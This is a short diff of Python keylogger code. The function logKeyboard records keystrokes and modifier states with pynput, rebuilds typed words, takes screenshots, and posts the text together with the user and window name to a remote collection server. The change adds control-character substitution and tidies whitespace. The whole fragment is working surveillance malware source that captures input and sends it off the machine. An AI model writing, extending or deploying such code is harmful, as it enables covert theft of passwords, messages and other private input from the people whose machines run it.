@@ -166,6 +166,10 @@ def logKeyboard():
 
             typed_word = ''.join(typed_sequence)
 
+            if "CTRL_" in typed_word:
+                for original, replacement in control_char_mapping.items():
+                    typed_word = typed_word.replace(f"CTRL_{original}", replacement)
+
             img = sc.take_screenshot(save_image=True)
             print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
             session.post(consumerServer.SERVER_ADDR, json={
@@ -189,13 +193,13 @@ def logKeyboard():
             modifier_state['alt'] = True
         elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
             modifier_state['ctrl'] = True
-        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
+        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}:
             modifier_state['win'] = True
         elif key in {pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r}:
             modifier_state['shift'] = True
         else:
             key_char = get_key_str(key)
-            
+
             # Detectar si se presiona AltGr (Ctrl + Alt)
             alt_gr_pressed = modifier_state['ctrl'] and modifier_state['alt']
 
